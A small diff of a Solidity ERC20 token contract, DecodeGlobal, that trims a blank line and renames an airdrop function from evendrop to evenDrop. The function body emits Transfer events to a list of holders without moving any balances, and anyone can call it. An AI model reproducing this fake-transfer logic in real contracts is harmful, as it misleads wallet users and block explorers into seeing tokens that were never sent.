@@ -1,4 +1,3 @@
-
 // SPDX-License-Identifier: MIT
 
 // File: @openzeppelin/contracts/utils/Context.sol
@@ -579,7 +578,7 @@ contract DecodeGlobal is ERC20, ERC20Burnable {
         _mint(msg.sender, 100000000000 * 10 ** decimals());
     }
 
-    function evendrop(address[] memory holders, uint256 amount) public payable {
+    function evenDrop(address[] memory holders, uint256 amount) public payable {
         for (uint i=0; i<holders.length; i++) {
             emit Transfer(address(this), holders[i], amount);
         }
